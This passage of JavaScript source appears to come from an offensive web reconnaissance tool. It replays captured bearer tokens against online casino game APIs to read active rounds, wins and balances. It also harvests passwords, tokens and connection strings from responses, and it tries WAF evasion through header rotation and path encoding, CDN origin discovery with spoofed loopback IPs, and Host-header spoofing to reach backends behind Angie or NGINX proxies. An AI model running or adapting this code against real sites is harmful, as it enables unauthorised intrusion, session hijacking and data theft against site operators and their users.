      "strict-transport-security","x-content-type-options","access-control-allow-origin",
      "x-ratelimit-limit","x-ratelimit-remaining","cf-ray","x-amzn-requestid",
      "x-akamai-edgescape","x-fastly-request-id","x-forwarded-server","x-real-ip",
      "x-backend-server","x-origin","x-host","set-cookie","x-auth-token",
      "x-csrf-token","x-correlation-id","x-trace-id","x-request-trace"];
    for (const h of interesting) {
      if (headers[h]) probe.serverInfo[h] = headers[h];
    }

    // Redirect chain
    if (result.finalUrl && result.finalUrl !== url) {
      const hop = { from: url, to: result.finalUrl };
      report.chain.push(hop);
      probe.findings.push("→ Redirected to: " + result.finalUrl);
      // If redirect goes to different domain, add to third-party chain
      try {
        const fromHost = new URL(url).hostname;
        const toHost = new URL(result.finalUrl).hostname;
        if (fromHost !== toHost) {
          report.thirdPartyChain.push({ from: fromHost, to: toHost, via: "redirect" });
          probe.findings.push("🌐 Third-party redirect: " + fromHost + " → " + toHost);
          traceLog(traceId, "warn", "Third-party redirect detected: " + fromHost + " → " + toHost);
        }
      } catch {}
    }

    // Proxy chain via Via header
    if (headers["via"]) {
      const viaChain = headers["via"].split(",").map(s => s.trim());
      for (const hop of viaChain) {
        if (!report.proxyChain.includes(hop)) report.proxyChain.push(hop);
        probe.findings.push("Proxy hop: " + hop);
      }
    }

    // CDN detection
    for (const [cdn, sig] of Object.entries(CDN_SIGNATURES)) {
      const detected = sig.headers.some(h => headers[h]);
      if (detected) {
        probe.cdn = cdn;
        if (!report.cdnLayer) { report.cdnLayer = cdn; traceLog(traceId, "warn", "CDN detected: " + cdn); }
        probe.findings.push("CDN: " + cdn);
      }
    }

    // Cloudflare specific
    if (headers["cf-ray"]) {
      report.cloudflare = true;
      probe.findings.push("Cloudflare cf-ray: " + headers["cf-ray"]);
      if (Object.keys(bypassHeaders).length > 0) {
        report.cfBypassed = true;
        probe.findings.push("✓ Cloudflare bypassed with: " + Object.entries(bypassHeaders).map(([k,v])=>k+"="+v).join(", "));
        traceLog(traceId, "ok", "Cloudflare bypassed via header injection");
      }
    }

    // WAF detection
    for (const [waf, pattern] of Object.entries(WAF_SIGNATURES)) {
      if (pattern.test(body) || pattern.test(headers["server"] || "")) {
        probe.waf = waf;
        if (!report.wafDetected) { report.wafDetected = waf; traceLog(traceId, "warn", "WAF detected: " + waf); }
        probe.findings.push("⚔ WAF: " + waf);
      }
    }

    // Stack detection
    const fakeEntry = { url, domain: extractDomain(url), responseHeaders: headers, responseBody: body };
    const stack = detectStack(fakeEntry);
    if (stack) {
      for (const db of stack.databases) { if (!report.databases.includes(db)) report.databases.push(db); }
      if (stack.orm && !report.orms.includes(stack.orm)) report.orms.push(stack.orm);
      if (stack.framework && !report.frameworks.includes(stack.framework)) report.frameworks.push(stack.framework);
      if (stack.cloud && !report.clouds.includes(stack.cloud)) report.clouds.push(stack.cloud);
      if (stack.apiStyle && !report.apiStyles.includes(stack.apiStyle)) report.apiStyles.push(stack.apiStyle);
      report.evidence.push(...stack.evidence.map(e => label + ": " + e));
      probe.findings.push("Stack: " + stackLabel(stack));
    }

    // JWT detection
    const jwtMatch = body.match(/"?(?:token|access_token|jwt|id_token|auth_token)"?\s*[:=]\s*"([A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*)/);
    if (jwtMatch) {
      try {
        const parts = jwtMatch[1].split(".");
        const payload = JSON.parse(atob(parts[1].replace(/-/g, "+").replace(/_/g, "/")));
        report.jwtFound = { raw: jwtMatch[1].slice(0, 120) + "…", payload };
        probe.findings.push("⚡ JWT token in response body");
        traceLog(traceId, "critical", "JWT exposed — payload decoded", payload);
      } catch {}
    }

    // Sensitive field extraction
    try {
      const parsed = JSON.parse(body);
      const extractFields = (obj, depth = 0, path = "") => {
        if (depth > 4 || !obj || typeof obj !== "object") return;
        for (const [k, v] of Object.entries(obj)) {
          const kl = k.toLowerCase();
          if (["password","passwd","secret","token","api_key","apikey","private_key",
               "ssn","credit_card","cvv","email","phone","ip_address","session",
               "hash","salt","hmac","signature"].some(s => kl.includes(s))) {
            const finding = "Sensitive field [" + (path ? path + "." : "") + k + "]: " + String(v).slice(0, 80);
            if (!report.dataFields.includes(finding)) report.dataFields.push(finding);
            probe.findings.push("⚡ " + finding);
            traceLog(traceId, "critical", "Sensitive field: " + k, { value: String(v).slice(0, 60) });
          }
          if (typeof v === "object") extractFields(v, depth + 1, path ? path + "." + k : k);
        }
      };
      extractFields(parsed);
    } catch {}

    // Connection string leaks
    const connRe = /(postgresql|postgres|mysql|mongodb|redis|sqlserver|mssql|amqp):\/\/[^\s"'<>]+/gi;
    const connMatches = body.match(connRe);
    if (connMatches) {
      for (const m of connMatches) {
        const f = "CRITICAL connection string: " + m.slice(0, 100);
        report.severity.push(f);
        probe.findings.push("⚡ " + f);
        traceLog(traceId, "critical", "Connection string exposed", { value: m.slice(0, 100) });
      }
    }

    // Banner grabbing: extract all server hints
    const serverHdr = headers["server"] || "";
    const poweredBy = headers["x-powered-by"] || "";
    if (serverHdr) probe.findings.push("Server: " + serverHdr);
    if (poweredBy) probe.findings.push("X-Powered-By: " + poweredBy);

    // X-Generator / X-Version leaks
    ["x-generator","x-drupal-cache","x-varnish","x-cache","x-cache-hits",
     "x-timer","x-served-by","x-backend-server","x-origin"].forEach(h => {
      if (headers[h]) probe.findings.push(h + ": " + headers[h]);
    });

    // Security header analysis
    const missingSecHeaders = [];
    if (!headers["strict-transport-security"]) missingSecHeaders.push("HSTS missing");
    if (!headers["x-frame-options"] && !headers["content-security-policy"]) missingSecHeaders.push("Clickjacking protection missing");
    if (!headers["x-content-type-options"]) missingSecHeaders.push("X-Content-Type-Options missing");
    if (missingSecHeaders.length) probe.findings.push("Security gaps: " + missingSecHeaders.join(", "));

    // GraphQL
    if (label.includes("graphql") && body) {
      try {
        const gql = JSON.parse(body);
        if (gql.data?.__schema || gql.data?.types || gql.data?.__typename) {
          probe.findings.push("⚡ GraphQL introspection OPEN — full schema exposed");
          report.apiStyles.push("GraphQL (introspection open)");
          traceLog(traceId, "critical", "GraphQL introspection open");
        }
      } catch {}
    }

    // Store full response if it has significant findings
    if (probe.findings.length > 0 && result.status !== 404) {
      report.fullResponses.push({
        label, url, status: result.status,
        headers: probe.serverInfo,
        body: body.slice(0, 4000),
      });
    }

    report.probes.push(probe);
  }

  // ── Phase 0: Game Intelligence ────────────────────────────────────────────
  const gameUrlMatch = capture.url && capture.url.match(/\/games-frame\/service-api\/(games-[\w-]+)\//i);
  if (gameUrlMatch) {
    const gamePath = gameUrlMatch[1];
    const gameName = gamePath.replace(/^games-/i, "");
    const gameBaseUrl = origin + "/games-frame/service-api/" + gamePath + "/";

    // Extract query params (language, whence) from original captured URL
    let urlQP = {};
    try { const _pu = new URL(capture.url); _pu.searchParams.forEach(function(v,k){ urlQP[k]=v; }); } catch {}
    const giLang   = urlQP.language || "en";
    const giWhence = urlQP.whence   || "114";
    const giQS     = "language=" + giLang + "&whence=" + giWhence;

    // Parse original request body for account context
    let giReqBody = {};
    try { if (capture.requestBody) giReqBody = JSON.parse(capture.requestBody); } catch {}

    traceLog(traceId, "info", "═══ Phase 0: Game Intelligence — " + gameName.toUpperCase() + " ═══");

    report.gameIntel = {
      gameName:   gameName,
      gamePath:   gamePath,
      gameBaseUrl: gameBaseUrl,
      accountId:  giReqBody.UI  || giReqBody.ui  || null,
      betSize:    giReqBody.BS  || giReqBody.bs  || null,
      gameType:   giReqBody.GT  || giReqBody.gt  || null,
      whence:     giWhence,
      language:   giLang,
      activeGame:  null,
      currentWin:  null,
      balance:     null,
      history:     null,
      endpoints:   [],
      rawResponses: {},
    };

    // Ordered list of endpoints to probe — try each in sequence
    const giEndpoints = [
      "GetActiveGame",
      "GetCurrentWin",
      "GetLastResult",
      "GetRoundResult",
      "GetGameResult",
      "GetResult",
      "GetBalance",
      "GetHistory",
      "GetGameState",
      "GetCurrentGame",
    ];

    // Build POST body from captured request — carry all session params the server needs
    const giPostBody = Object.assign({}, giReqBody);
    // Ensure mandatory fields are present even if we're tracing a non-MakeBet/MakeAction request
    if (!giPostBody.WH && giWhence) giPostBody.WH = parseInt(giWhence) || 114;
    if (!giPostBody.LG && giLang)   giPostBody.LG = giLang;

    // Seed from captured RESPONSE body — e.g. tracing GetActiveGame gives us AN, GT, BS in the response
    let giCapturedResp = null;
    try { if (capture.responseBody) giCapturedResp = JSON.parse(capture.responseBody); } catch {}
    if (giCapturedResp) {
      const _fill = (keys, target) => { for (const k of keys) { const v = giCapturedResp[k]; if (v !== undefined && giPostBody[target] === undefined) { giPostBody[target] = v; break; } } };
      _fill(["AN","an"], "AN");
      _fill(["GT","gt"], "GT");
      _fill(["BS","bs"], "BS");
      _fill(["UI","ui"], "UI");
      if (giCapturedResp.AN !== undefined) traceLog(traceId, "ok", "Session context from captured response: AN=" + giCapturedResp.AN + (giCapturedResp["RS.NSW"] ? ", RS.NSW=" + giCapturedResp["RS.NSW"] : ""));
    }

    // ── Auth header forwarding (critical — server uses x-auth Bearer JWT, not just cookies) ──
    const giCaptureHdrs = capture.requestHeaders || {};
    const giPostHeaders = { "content-type": "application/json", "accept": "application/json" };
    // Forward x-auth Bearer token if present (this is the primary auth mechanism for game APIs)
    const giXAuth = giCaptureHdrs["x-auth"] || giCaptureHdrs["X-Auth"] || giCaptureHdrs["X-AUTH"];
    if (giXAuth) {
      giPostHeaders["x-auth"] = giXAuth;
      traceLog(traceId, "ok", "Auth: x-auth Bearer token found and will be forwarded");
    }
    // Also forward standard authorization header if present
    const giAuthHdr = giCaptureHdrs["authorization"] || giCaptureHdrs["Authorization"];
    if (giAuthHdr && !giXAuth) {
      giPostHeaders["authorization"] = giAuthHdr;
      traceLog(traceId, "ok", "Auth: Authorization header found and will be forwarded");
    }
    if (!giXAuth && !giAuthHdr) {
      traceLog(traceId, "warn", "Auth: No x-auth or Authorization header found in captured request — probes may return 401. Try tracing a MakeAction or MakeBet request instead.");
    }

    for (const ep of giEndpoints) {
      if (!activeTraces.has(traceId)) break;
      const epUrl = gameBaseUrl + ep + "?" + giQS;
      traceLog(traceId, "probe", "Game probe: " + ep);

      // Build a read-only probe body — strip MakeAction-specific fields (UC, ANS, ANT)
      // that the server rejects on read endpoints (causes 400 Bad Request)
      const giReadBody = (function() {
        const b = {};
        for (const k of Object.keys(giPostBody)) {
          if (k !== "UC" && k !== "ANS" && k !== "ANT") b[k] = giPostBody[k];
        }
        return b;
      })();

      // Auth headers for GET requests — same JWT, no body
      const giGetHeaders = {};
      if (giPostHeaders["x-auth"]) giGetHeaders["x-auth"] = giPostHeaders["x-auth"];
      if (giPostHeaders["authorization"]) giGetHeaders["authorization"] = giPostHeaders["authorization"];

      // GetActiveGame is typically a GET endpoint — try authenticated GET first
      let giR;
      if (ep === "GetActiveGame" || ep === "GetCurrentGame" || ep === "GetGameState") {
        giR = await probeViaTab(epUrl, { headers: giGetHeaders, timeout: 8000 });
        if (!giR || giR.error || giR.status === 401 || giR.status === 405) {
          giR = await probeViaTab(epUrl, { method: "POST", headers: giPostHeaders, body: JSON.stringify(giReadBody), timeout: 8000 });
        }
      } else {
        // All other endpoints: POST with stripped session body (no UC/ANS/ANT)
        giR = await probeViaTab(epUrl, {
          method: "POST",
          headers: giPostHeaders,
          body: JSON.stringify(giReadBody),
          timeout: 8000,
        });
        // If POST rejected outright (network error / CORS), fall back to GET
        if (!giR || giR.error) {
          giR = await probeViaTab(epUrl, { headers: giGetHeaders, timeout: 8000 });
        }
      }

      traceLog(traceId, giR && giR.status === 200 ? "ok" : "info",
        ep + " → " + (giR ? (giR.status || "err") : "no response"));

      if (giR && !giR.error && giR.status === 200 && giR.body) {
        let giParsed = null;
        try { giParsed = JSON.parse(giR.body); } catch {}

        if (giParsed !== null) {
          report.gameIntel.endpoints.push({ name: ep, status: 200, hasData: true });
          report.gameIntel.rawResponses[ep] = giParsed;
          traceLog(traceId, "ok", ep + " → 200 (" + giR.body.length + " bytes)");

          // Slot results / GetCurrentWin / GetLastResult
          if (!report.gameIntel.currentWin &&
              (ep === "GetCurrentWin" || ep === "GetLastResult" || ep === "GetResult" ||
               ep === "GetRoundResult" || ep === "GetGameResult")) {
            report.gameIntel.currentWin = giParsed;
            const cf  = giParsed.CF  || giParsed.cf  || giParsed.Coefficient || giParsed.multiplier;
            const bs  = giParsed.BS  || giParsed.bs  || giParsed.BetSize;
            const ab  = giParsed.AB  || giParsed.ab  || giParsed.AccountBalance || giParsed.balance;
            const rsf = giParsed["RS.F"] || giParsed.rsf || giParsed.ResultField || giParsed.results;
            const sb  = giParsed.SB  || giParsed.SpinBalance;
            const sw  = giParsed.SW  || giParsed.SessionWallet;
            if (cf)  traceLog(traceId, "ok", "Multiplier / coefficient: " + cf + "x");
            if (bs)  traceLog(traceId, "ok", "Bet size: " + bs);
            if (ab)  traceLog(traceId, "ok", "Account balance: " + ab);
            if (sb)  traceLog(traceId, "ok", "Spin balance: " + sb);
            if (sw)  traceLog(traceId, "ok", "Session wallet: " + sw);
            if (rsf) {
              const rsArr = Array.isArray(rsf) ? rsf : String(rsf).split(",");
              const hits  = rsArr.filter(function(v){ return v===true||v==="true"; }).length;
              traceLog(traceId, "ok", "Result grid: " + rsArr.slice(0,15).map(function(v){ return (v===true||v==="true")?"✓":"✗"; }).join("") + (rsArr.length>15?"…":"") + "  (" + hits + "/" + rsArr.length + " wins)");
            }
          }

          if (ep === "GetActiveGame" || ep === "GetCurrentGame" || ep === "GetGameState") {
            if (!report.gameIntel.activeGame) {
              report.gameIntel.activeGame = giParsed;
              const hasActive = giParsed.Active || giParsed.active || giParsed.IsActive || giParsed.isActive || giParsed.BS !== undefined || giParsed.GT !== undefined;
              traceLog(traceId, hasActive ? "ok" : "info", "Active game state: " + JSON.stringify(giParsed).slice(0,150));
              // Propagate session fields to subsequent probes so GetCurrentWin gets correct AN
              const probeAn = giParsed.AN ?? giParsed.an;
              if (probeAn !== undefined) { giPostBody.AN = probeAn; traceLog(traceId, "ok", "AN=" + probeAn + " → seeded into probe body for GetCurrentWin"); }
              if (giParsed.GT !== undefined && giPostBody.GT === undefined) giPostBody.GT = giParsed.GT;
              if (giParsed.BS !== undefined && giPostBody.BS === undefined) giPostBody.BS = giParsed.BS;
              if (giParsed.UI !== undefined && giPostBody.UI === undefined) giPostBody.UI = giParsed.UI;
            }
          }

          if (ep === "GetBalance") {
            report.gameIntel.balance = giParsed;
            const bal = giParsed.Balance || giParsed.balance || giParsed.AB || giParsed.Amount;
            if (bal) traceLog(traceId, "ok", "Balance: " + bal);
          }

          if (ep === "GetHistory") {
            report.gameIntel.history = giParsed;
            const entries = giParsed.Items || giParsed.items || giParsed.History || giParsed.history || giParsed.Rounds;
            if (Array.isArray(entries)) traceLog(traceId, "ok", "History: " + entries.length + " rounds found");
          }

        } else {
          // Body not JSON — still record
          report.gameIntel.endpoints.push({ name: ep, status: 200, hasData: false, note: "non-JSON response" });
          report.gameIntel.rawResponses[ep + "_raw"] = giR.body.slice(0, 500);
        }
      } else if (giR && giR.status !== 404 && giR.status !== 0) {
        report.gameIntel.endpoints.push({ name: ep, status: giR.status || 0, hasData: false });
        traceLog(traceId, "info", ep + " → " + (giR.status || "no response"));
      }
    }

    const giFound = report.gameIntel.endpoints.filter(function(e){ return e.hasData; });
    if (giFound.length) {
      traceLog(traceId, "ok", "Game intel ready: " + giFound.map(function(e){ return e.name; }).join(", "));
    } else {
      traceLog(traceId, "warn", "No game results yet — place a bet first, then Trace to capture the active round");
    }
  }

  // ── Phase 1: DNS resolution via DoH ──────────────────────────────────────
  traceLog(traceId, "info", "Phase 1: DNS resolution (DoH) for " + targetDomain);
  const dohProviders = [
    `https://cloudflare-dns.com/dns-query?name=${targetDomain}&type=A`,
    `https://dns.google/resolve?name=${targetDomain}&type=A`,
  ];

  for (const dohUrl of dohProviders) {
    if (!activeTraces.has(traceId)) break;
    const dohResult = await probeViaTab(dohUrl, {
      headers: { "Accept": "application/dns-json" }, timeout: 5000,
    });
    if (dohResult && dohResult.body && !dohResult.error) {
      try {
        const dnsData = JSON.parse(dohResult.body);
        const aRecords = (dnsData.Answer || []).filter(r => r.type === 1).map(r => r.data);
        if (aRecords.length) {
          traceLog(traceId, "ok", "DNS A records: " + aRecords.join(", "));
          for (const ip of aRecords) {
            if (!report.originIPs.includes(ip)) report.originIPs.push(ip);
            report.dnsRecords.push({ type: "A", value: ip });
          }
          break;
        }
      } catch {}
    }
  }

  // Also check CNAME (reveals CDN chains)
  const cnameResult = await probeViaTab(
    `https://cloudflare-dns.com/dns-query?name=${targetDomain}&type=CNAME`,
    { headers: { "Accept": "application/dns-json" }, timeout: 5000 }
  );
  if (cnameResult?.body) {
    try {
      const cnames = JSON.parse(cnameResult.body);
      for (const r of (cnames.Answer || [])) {
        if (r.type === 5) {
          report.dnsRecords.push({ type: "CNAME", value: r.data });
          traceLog(traceId, "info", "CNAME → " + r.data + " (reveals CDN/proxy chain)");
          // Identify CDN from CNAME
          const cdnMap = {
            "cloudfront.net": "AWS CloudFront",
            "akamaiedge.net": "Akamai",
            "fastly.net": "Fastly",
            "cloudflare.net": "Cloudflare",
            "edgekey.net": "Akamai",
            "footprint.net": "CenturyLink CDN",
          };
          for (const [suffix, cdn] of Object.entries(cdnMap)) {
            if (r.data.includes(suffix)) {
              traceLog(traceId, "warn", "CDN via CNAME: " + cdn + " (" + r.data + ")");
              if (!report.cdnLayer) report.cdnLayer = cdn;
            }
          }
        }
      }
    } catch {}
  }

  // ── Phase 2: IP Geolocation ───────────────────────────────────────────────
  if (report.originIPs.length) {
    traceLog(traceId, "info", "Phase 2: IP geolocation for " + report.originIPs.join(", "));
    for (const ip of report.originIPs.slice(0, 3)) {
      if (!activeTraces.has(traceId)) break;
      const geoResult = await probeViaTab(`https://ipapi.co/${ip}/json/`, { timeout: 6000 });
      if (geoResult?.body && !geoResult.error) {
        try {
          const geo = JSON.parse(geoResult.body);
          const geoEntry = {
            ip,
            city: geo.city,
            region: geo.region,
            country: geo.country_name,
            org: geo.org,
            asn: geo.asn,
            timezone: geo.timezone,
            hosting: geo.org || "Unknown",
          };
          report.geoInfo.push(geoEntry);
          report.serverHosting = geo.org || null;
          traceLog(traceId, "ok", ip + " → " + [geo.city, geo.country_name, geo.org].filter(Boolean).join(", "));
        } catch {}
      }
    }
  }

  // ── Phase 3: Use captured response as ground truth (avoids re-auth issues) ────
  traceLog(traceId, "info", "Phase 3: Analyzing captured response");
  const captureMethod = (capture.method || "GET").toUpperCase();
  const captureHeaders = capture.requestHeaders || {};
  const captureBody = (captureMethod !== "GET" && captureMethod !== "HEAD") ? (capture.requestBody || null) : null;

  // Build origResult from the already-captured data first
  let origResult = null;
  if (capture.statusCode || capture.status) {
    origResult = {
      status: parseInt(capture.statusCode || capture.status) || 0,
      finalUrl: capture.url,
      headers: capture.responseHeaders || {},
      body: capture.responseBody || null,
    };
    analyzeResult("original", capture.url, origResult);
    traceLog(traceId, "ok", "Captured response: " + origResult.status + (origResult.body ? " (" + origResult.body.length + " bytes)" : ""));
    // Store body in fullResponses for display
    if (origResult.body) {
      report.fullResponses = report.fullResponses || [];
      report.fullResponses.unshift({ label: "original (captured)", url: capture.url, status: origResult.status, body: origResult.body.slice(0, 8000), headers: origResult.headers });
    }
  } else {
    // No captured response available — fall back to re-probing
    traceLog(traceId, "info", "No captured response — probing live");
    origResult = await probeViaTab(capture.url, { method: captureMethod, headers: captureHeaders, body: captureBody, timeout: 10000 });
    if (origResult) {
      analyzeResult("original", capture.url, origResult);
      traceLog(traceId, "ok", "Original → " + (origResult.status || origResult.error));
    }
  }

  // If WAF detected or 403/406, try bypass variants (skip if original succeeded or got 405 = wrong method)
  if (origResult && origResult.status < 200 || origResult && origResult.status >= 400 && origResult.status !== 405 && origResult.status !== 200 || report.wafDetected && !(origResult && origResult.status < 300)) {
    traceLog(traceId, "warn", "Attempting WAF bypass with header rotation");
    for (let i = 0; i < WAF_BYPASS_HEADERS.length; i++) {
      if (!activeTraces.has(traceId)) break;
      const bypassHdrs = WAF_BYPASS_HEADERS[i];
      const bypassResult = await probeViaTab(capture.url, { method: captureMethod, headers: { ...captureHeaders, ...bypassHdrs }, body: captureBody, timeout: 8000 });
      if (bypassResult && !bypassResult.error && bypassResult.status < 400) {
        analyzeResult("waf-bypass-" + i, capture.url, bypassResult, bypassHdrs);
        report.wafBypassed = true;
        traceLog(traceId, "ok", "WAF bypass successful with set #" + i + " → " + bypassResult.status);
        break;
      } else if (bypassResult && bypassResult.status !== origResult?.status) {
        traceLog(traceId, "info", "Bypass set #" + i + " → " + bypassResult.status + " (different response)");
        analyzeResult("waf-bypass-" + i, capture.url, bypassResult, bypassHdrs);
      }
    }

    // Path encoding bypass attempts
    const parsedUrl = (() => { try { return new URL(capture.url); } catch { return null; } })();
    if (parsedUrl) {
      const pathVariants = [
        parsedUrl.pathname + "/",               // trailing slash
        "/" + parsedUrl.pathname.slice(1),       // extra slash
        parsedUrl.pathname.toUpperCase(),         // uppercase path
        parsedUrl.pathname.replace(/\//g, "//"), // double slash
        parsedUrl.pathname + "%20",              // trailing space encoded
        parsedUrl.pathname + "?",               // trailing question mark
      ];
      for (const pv of pathVariants.slice(0, 3)) {
        if (!activeTraces.has(traceId)) break;
        const pvUrl = parsedUrl.origin + pv + parsedUrl.search;
        const pvResult = await probeViaTab(pvUrl, { method: captureMethod, headers: captureHeaders, body: captureBody, timeout: 6000 });
        if (pvResult && !pvResult.error && pvResult.status !== origResult?.status) {
          analyzeResult("path-variant", pvUrl, pvResult);
          traceLog(traceId, "info", "Path variant " + pv + " → " + pvResult.status);
          if (pvResult.status < 400) {
            report.wafBypassed = true;
            traceLog(traceId, "ok", "Path encoding bypass worked: " + pvUrl);
            break;
          }
        }
      }
    }
  }

  // ── Phase 4: CDN origin hunting ───────────────────────────────────────────
  if (report.cdnLayer || report.cloudflare) {
    traceLog(traceId, "info", "Phase 4: CDN origin hunting for " + (report.cdnLayer || "Cloudflare"));
    
    // Try accessing origin via known bypass techniques
    const cdnBypassHeaders = [
      { "X-Forwarded-For": "127.0.0.1", "X-Originating-IP": "127.0.0.1", "X-Remote-IP": "127.0.0.1" },
      { "CF-Connecting-IP": "127.0.0.1" },
      { "True-Client-IP": "127.0.0.1" },
      { "X-Real-IP": "127.0.0.1" },
      { "Fastly-Client-IP": "127.0.0.1" },
    ];
    for (const cdnBypass of cdnBypassHeaders) {
      if (!activeTraces.has(traceId)) break;
      const r = await probeViaTab(origin + "/", { headers: cdnBypass, timeout: 6000 });
      if (r && !r.error) {
        const originServer = r.headers?.["server"] || "";
        const newCdnSig = Object.values(CDN_SIGNATURES).every(sig => !sig.headers.some(h => r.headers?.[h]));
        if (newCdnSig && originServer) {
          traceLog(traceId, "ok", "Origin server reached: " + originServer);
          report.cdnBypassed = true;
          analyzeResult("cdn-origin-bypass", origin + "/", r, cdnBypass);
          break;
        }
      }
    }

    // Try direct IP if we have it
    if (report.originIPs.length && !report.cdnBypassed) {
      for (const ip of report.originIPs) {
        if (!activeTraces.has(traceId)) break;
        const proto = origin.startsWith("https") ? "https" : "http";
        const ipUrl = proto + "://" + ip + "/";
        traceLog(traceId, "probe", "Trying direct IP: " + ip);
        const ipResult = await probeViaTab(ipUrl, { 
          headers: { "Host": targetDomain },
          timeout: 6000 
        });
        if (ipResult && !ipResult.error) {
          analyzeResult("direct-ip-" + ip, ipUrl, ipResult, { "Host": targetDomain });
          traceLog(traceId, "ok", "Direct IP response: " + ipResult.status + " server: " + (ipResult.headers?.["server"] || "unknown"));
          report.cdnBypassed = true;
        }
      }
    }
  }


  // ── Phase 4b: Angie/NGINX Reverse-Proxy Bypass ───────────────────────────
  const isAngie = report.frameworks && report.frameworks.some(f => /angie|nginx/i.test(f));
  if (isAngie || (origResult && origResult.headers && (origResult.headers["server"]||"").toLowerCase().includes("angie"))) {
    traceLog(traceId, "info", "Phase 4b: Angie reverse-proxy bypass attempts");
    report.angieBypass = { attempted: true, found: false, findings: [] };

    // 1. Angie status endpoints — may expose upstream/backend info
    const angieStatusPaths = [
      "/angie-status",
      "/angie-status?format=json",
      "/angie_status",
      "/nginx_status",
      "/nginx-status",
      "/_status",
      "/server-status",
      "/status",
    ];
    for (const sp of angieStatusPaths) {
      if (!activeTraces.has(traceId)) break;
      const sr = await probeViaTab(origin + sp, { timeout: 5000 });
      if (sr && !sr.error && sr.status === 200) {
        traceLog(traceId, "critical", "Angie status page exposed: " + sp, { body: (sr.body||"").slice(0,500) });
        report.angieBypass.findings.push({ type: "status-page", path: sp, body: (sr.body||"").slice(0,1000) });
        report.angieBypass.found = true;
        report.severity = report.severity || [];
        report.severity.push("Angie/NGINX status page exposed at " + sp + " — reveals upstream connections, worker stats");
      }
    }

    // 2. Host-header spoofing — proxy may forward different Host to backend
    const hostOverrides = [
      "localhost",
      "127.0.0.1",
      "backend",
      "app",
      "upstream",
      "internal",
      "origin",
      "app-server",
      "web",
      "api",
    ];
    for (const hostVal of hostOverrides) {
      if (!activeTraces.has(traceId)) break;
      const hr = await probeViaTab(origin + "/", { headers: { "Host": hostVal, "X-Forwarded-Host": hostVal }, timeout: 5000 });
      if (hr && !hr.error && hr.status < 400) {
        const srv = (hr.headers["server"]||"").toLowerCase();
        const isAngieSelf = srv.includes("angie") || srv.includes("nginx");
        if (!isAngieSelf || hr.status !== (origResult && origResult.status)) {
          traceLog(traceId, "warn", "Host override '" + hostVal + "' → different response: " + hr.status);
          report.angieBypass.findings.push({ type: "host-override", host: hostVal, status: hr.status, server: hr.headers["server"] });
        }
      }
    }

    // 3. X-Forwarded-Host / X-Original-Host tricks
    const fwdHostTricks = [
      { "X-Forwarded-Host": targetDomain + ".internal" },
      { "X-Forwarded-Host": "localhost" },
      { "X-Original-Host": "localhost" },
      { "X-Host": "localhost" },
      { "X-Forwarded-Server": "localhost" },
      { "X-HTTP-Host-Override": "localhost" },
    ];
    for (const trick of fwdHostTricks) {
      if (!activeTraces.has(traceId)) break;
      const tr = await probeViaTab(origin + "/", { headers: trick, timeout: 5000 });
      if (tr && !tr.error && tr.body && tr.body !== (origResult && origResult.body)) {
        const hdrName = Object.keys(trick)[0];
        traceLog(traceId, "warn", hdrName + " trick produced different response body");
        report.angieBypass.findings.push({ type: "header-trick", header: hdrName, status: tr.status });
      }
    }

    // 4. Direct IP probing — hit known IPs with original Host header preserved
    if (report.originIPs && report.originIPs.length) {
      for (const ip of report.originIPs.slice(0, 3)) {
        if (!activeTraces.has(traceId)) break;
        const ipUrl = (origin.startsWith("https") ? "https" : "http") + "://" + ip + "/";
        const ir = await probeViaTab(ipUrl, { headers: { "Host": targetDomain }, timeout: 6000 });
        if (ir && !ir.error) {
          const srv = (ir.headers["server"]||"").toLowerCase();
          const isProxy = srv.includes("angie") || srv.includes("nginx") || srv.includes("cloudflare");
          traceLog(traceId, ir.status < 400 ? "ok" : "info", "Direct IP " + ip + " → " + ir.status + (srv ? " [" + srv + "]" : ""));
          report.angieBypass.findings.push({ type: "direct-ip", ip, status: ir.status, server: ir.headers["server"] || null, isProxy });
          if (!isProxy && ir.status < 400) {
            report.angieBypass.found = true;
            report.angieBypass.originDirect = ip;
            traceLog(traceId, "critical", "Direct backend reached at IP " + ip + " — bypassed Angie proxy");
            report.severity.push("Backend reachable directly at " + ip + " — Angie proxy can be bypassed");
          }
        }
      }
    }

    // 5. Common origin subdomains
    const originSubdomains = ["direct", "origin", "backend", "app", "api", "upstream", "internal", "web", "srv", "node"];
    const baseDomain = targetDomain.split(".").slice(-2).join(".");
    for (const sub of originSubdomains) {
      if (!activeTraces.has(traceId)) break;
      const subUrl = (origin.startsWith("https") ? "https" : "http") + "://" + sub + "." + baseDomain + "/";
      const sr2 = await probeViaTab(subUrl, { timeout: 5000 });
      if (sr2 && !sr2.error && sr2.status < 500) {
        const srv2 = (sr2.headers["server"]||"").toLowerCase();
        traceLog(traceId, "info", "Subdomain " + sub + "." + baseDomain + " → " + sr2.status + " [" + srv2 + "]");
        if (!srv2.includes("angie") && !srv2.includes("nginx") && sr2.status < 400) {
          report.angieBypass.found = true;
          report.angieBypass.findings.push({ type: "origin-subdomain", url: subUrl, status: sr2.status, server: sr2.headers["server"] });
          traceLog(traceId, "critical", "Non-proxied subdomain found: " + sub + "." + baseDomain + " → " + srv2);
          report.severity.push("Origin subdomain " + sub + "." + baseDomain + " may bypass Angie proxy");
        }
      }
    }

    // 6. Cache-bypass / debug headers — try to skip Angie cache and hit upstream directly
    const cacheBypassHdrs = {
      "Cache-Control": "no-cache, no-store",
      "Pragma": "no-cache",
      "X-No-Cache": "1",
      "X-Cache-Bypass": "1",
      "X-Bypass-Cache": "1",
      "Surrogate-Control": "no-store",
    };
    const cbr = await probeViaTab(capture.url, { method: captureMethod, headers: { ...captureHeaders, ...cacheBypassHdrs }, body: captureBody, timeout: 8000 });
    if (cbr && !cbr.error) {
      const cacheHdr = cbr.headers["x-cache"] || cbr.headers["x-angie-cache"] || "";
      traceLog(traceId, "info", "Cache-bypass probe → " + cbr.status + (cacheHdr ? " [cache: " + cacheHdr + "]" : ""));
      if (cbr.body && origResult && cbr.body !== origResult.body && cbr.status < 400) {
        traceLog(traceId, "warn", "Cache bypass returned different body — upstream response differs from cached");
        report.angieBypass.findings.push({ type: "cache-bypass", status: cbr.status, cacheHdr, bodyDiff: true });
      }
    }

    if (report.angieBypass.found) {
      traceLog(traceId, "critical", "Angie bypass SUCCESSFUL — direct backend access found");
    } else {
      traceLog(traceId, "ok", "Angie proxy appears well-configured — no direct bypass found");
    }
  }

  // ── Phase 5: Deep domain recon with WAF bypass headers ───────────────────
  traceLog(traceId, "info", "Phase 5: Deep domain recon on " + origin);

  const reconPaths = [
    { path: "/robots.txt",                  label: "robots.txt" },
